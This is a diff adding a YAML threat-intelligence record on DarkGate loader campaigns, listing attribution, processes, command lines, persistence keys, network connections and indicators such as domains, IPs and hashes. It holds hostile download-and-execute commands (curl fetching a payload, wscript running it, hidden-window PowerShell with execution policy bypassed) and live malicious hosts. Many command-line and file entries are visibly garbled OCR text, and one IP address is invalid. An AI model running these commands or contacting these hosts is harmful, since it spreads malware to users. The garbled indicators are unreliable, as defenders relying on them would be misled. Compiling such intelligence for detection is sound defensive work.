@@ -1,0 +1,100 @@
+description: EclecticIQ analysts observed an increase in DarkGate loader deliveries
+  following the Qakbot takedown, primarily used by financially motivated threat actors
+  targeting financial institutions in Europe and the USA.
+attribution: TA577, Ducktail, BianLian, Black Basta
+malware_families:
+- DarkGate
+TTPs:
+  processes:
+  - Curl.exe
+  - wscript.exe
+  - cscript.exe
+  - Autoit.exe
+  - notepad.exe
+  - cnd.exe
+  - powershell.exe
+  - rundll32.exe
+  commandline:
+  - curl.exe -o %TEMP%\darkgate.au3 <URL>
+  - wscript.exe //E:C:\\temp\\darkgate.au3
+  - cscript.exe \\\\.\\root\\DarkGate.dll
+  - iTunesHelper.exe
+  - cnd.exe\\end. exe
+  - jc adn || ecHO aJEn & P*In'G adEn || CRUMRL -/t 5 42T /00 eyt oSRpNAJEN.vbs &
+    PIn'G -n 3 AJEn || C3\\"GRIIPE 1oL U 6 e LTKeGrimissep AVDocuneluctidative.pdt
+  - SindLrs\\systen32\\cnd. exe DarkGateAoV \\Windows\\Systen32cndexeSysten POF Reader
+    v1.50.166-..\\..\\..\\...\\..\\...\\.. \\Windows\\Systen32\\cnd. exe7c s || echo
+    ths & Pring ts || CumrTML it pe//*195.7125. 117" 05/ cyke/tnUMRRLAS Log & PTing
+    -n 4 iAs
+  - rundll132 iniuiAs Loy scab /k besogon728 & ExIT"
+  - GhoyKYX\\Factura-NC#6.pdfswindirt\\systen32\\cnd. exe IcediDaravenakingspargersDeskiopiclim:11-2-
+    THAGURT-23 pfL Download -@ Thisfile can not be viewed because of an securty error
+    with the POF viewer.To open this fle Download from OneDrive Clou.PN
+  - powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Users\\IWSFDoskipideck!.iTunes.
+    5612 QuerySecuryFie CaUseraiWSF Daskopdack!Tunes. 5812 5 QuenySecuryFiie CiUsarsiWSF
+    Daskopdack!Tunes. 5812 =CloseFle CAUsersIWSFiDosktopideck!04 60 50 AL A oF 63
+    5 w0 Sa
+  powershell:
+  - C:\\Users\\IWSFDoskipideck!.iTunes. 5612 QuerySecuryFie CaUseraiWSF Daskopdack!Tunes.
+    5812 5 QuenySecurityFiie CiUsarsiWSF Daskopdack!Tunes. 5812 =CloseFle CAUsersIWSFiDosktopideck!04
+    60 50 AL A oF 63 5 w0 Sa
+  scripting_engine:
+  - VBScript (.AU3 format)
+  - AutoIT
+  registry_keys:
+  - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load:
+  - iTunesHelper.exe loading CoreFoundation.dll
+  network_connections:
+  - 'Executable: Curl.exe, Destination Address: myhairven[.]com/hnun/?v=2932774, Port:
+    80'
+  - 'Executable: Curl.exe, Destination Address: projetodegente[.]com, Port: 80'
+  - executable: cnd.exe
+    destination_address: 195.7125.117
+    port: '05'
+  - executable: DarkGateV6.exe
+    url: http://newdomainfortesteenestle.com:443
+  file_activity:
+  - C:\\temp\\darkgate.au3
+  - C:\\temp\\script.au3
+  - C:\\temp\\DarkGate.dll
+  - C:\\Windows\\System32\\cnd. exe
+  - DarkGateAoV \\Windows\\Systen32cndexe
+  - C:\\Users\\IWSFDoskipideck!.iTunes. 5612 QuerySecuryFie CaUseraiWSF Daskopdack!Tunes.
+    5812
+  - GhoyKYX\\Factura-NC#6.pdf
+  persistence:
+  - Windows registry Run Keys
+  - LNK file in the user's Startup folder
+  pipes: ''
+  process_relations:
+  - AutoIT.exe -> DarkGate payload execution
+IOCs:
+- 'User-Agent: Mozilla/4.0 (compatible; Synapse)'
+- Newdomainfortesteenestle[.]com
+- Mainsercheronlinehostingbot[.]com
+- adclick.g.doubleclick[.]net/pcs/click?f957443683554531pn9713-24-QfP574vIONEZlkd&&adurl=//projetodegente[.]com/
+- adclick.g.doubleclick[.]net/pcs/click?adurl=//higreens[.]co[.]in
+- 5.252.178[.]193@80/Downloads/independert.zip/independert.msi
+- 5[.]181[.]159[.]64/Downloads/trefald.zip
+- 237d1bca6e056df5bb16a1216a434634109478f882d3b1d58344c801d184f95d
+- c83870e8f4884f6653ad7fe43d43e9ab8d6c8b3c295d10f1f1921acd8f1e42a8
+- 24f38012941211da96f82938320fdbbcb4cf72e26fbe97dc4ad8d1da63da1574
+- 57379fe988e3f7072312b7c2235f13ee4df2907e3243fdec47f658ae2dc395e5
+- d70199d3f662e922363ed36d7eaf9b0dab895b9776370514b53b12099a30a802
+- 6d0a906f3764e755d50412c58e70868db223da4a4a6ce1770f27dd9042a869bc
+- a53be1e2a6f17a5f4c22ac6fcd24fd70e04cd2c768ed83e84155e37b2a14bcbd
+- 1efbfb8f9e441370bb3f3a316fea237564eefebbf4ba33cccdae5f853c86a7b0
+- 2d61625a0e63ab4491deab98c76aa02ba583b4c655b55c1672b74338c20e39dd
+- 8738866be2f39ac05df243bbe2c82dfc6c125643cc5c75e5f199701fbacc90c9
+- 0a2bb0730657fcba380c280663c5e4174586fda123f7a6c6f270a9356229ed8b
+- hash: Unknown
+- ip_address: 195.7125.117
+- domain: newdomainfortesteenestle.com
+- url: http://newdomainfortesteenestle.com:443
+authors:
+- Arda Büyükkaya
+reference: https://blog.eclecticiq.com/darkgate-opening-gates-for-financially-motivated-threat-actors
+date_of_publication: Feb 12, 2024
+file_creation_date: June 08, 2025
